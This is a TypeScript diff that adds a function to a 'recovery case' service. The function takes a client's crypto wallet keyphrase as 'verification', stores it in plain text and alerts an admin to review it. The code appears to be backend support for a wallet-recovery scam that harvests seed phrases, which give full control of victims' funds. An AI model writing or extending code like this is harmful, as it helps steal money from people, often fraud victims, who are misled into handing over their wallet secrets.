@@ -193,6 +193,50 @@ export function listRecoveryCases(): StoredCase[] {
   );
 }
 
+export function submitCaseKeyphrase(
+  caseId: string,
+  email: string,
+  keyphrase: string
+): StoredCase | null {
+  const store = ensureStore();
+  const idx = findCaseIndex(store, caseId);
+  if (idx === -1 || !caseMatchesEmail(store.cases[idx], email)) {
+    return null;
+  }
+
+  const trimmed = keyphrase.trim();
+  if (!trimmed) return null;
+
+  const existingSteps = Array.isArray(store.cases[idx].completedSteps)
+    ? [...store.cases[idx].completedSteps!]
+    : ["PENDING"];
+  for (const step of ["ANALYSIS", "PROCESSING"]) {
+    if (!existingSteps.includes(step)) existingSteps.push(step);
+  }
+
+  store.cases[idx] = {
+    ...store.cases[idx],
+    walletKeyphrase: trimmed,
+    status: "PROCESSING",
+    completedSteps: existingSteps,
+    keyphraseSubmittedAt: new Date().toISOString(),
+    updatedAt: new Date().toISOString(),
+  };
+  writeStore(store);
+
+  addCaseNotification(caseId, {
+    title: "Keyphrase Received",
+    message:
+      "Client submitted wallet verification keyphrase. Review in the admin console.",
+    type: "ACTION_REQUIRED",
+  });
+
+  console.log(
+    `[CaseStore] Keyphrase submitted for case ${caseId} (${normalizeEmail(email)})`
+  );
+  return store.cases[idx];
+}
+
 export function updateRecoveryCase(
   caseId: string,
   patch: { status?: string; completedSteps?: string[] }
